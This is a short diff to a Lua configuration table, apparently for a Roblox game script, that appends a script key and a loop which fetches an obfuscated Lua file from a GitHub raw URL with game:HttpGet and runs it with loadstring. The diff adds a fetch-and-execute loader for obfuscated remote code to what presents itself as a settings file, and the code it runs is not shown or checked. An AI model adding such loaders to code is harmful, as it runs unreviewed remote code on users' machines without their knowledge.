@@ -105,3 +105,5 @@ _G.GAGConfig = _G.GAGConfig or {
         ["Hide Crop Visuals"] = false,
     },
 }
+script_key="7ECF8FC9340DD1F67092AC7E1E16CC04";
+local s,r repeat s,r=pcall(function()return game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/gag-obfuscated.lua")end)wait(1)until s;loadstring(r)()
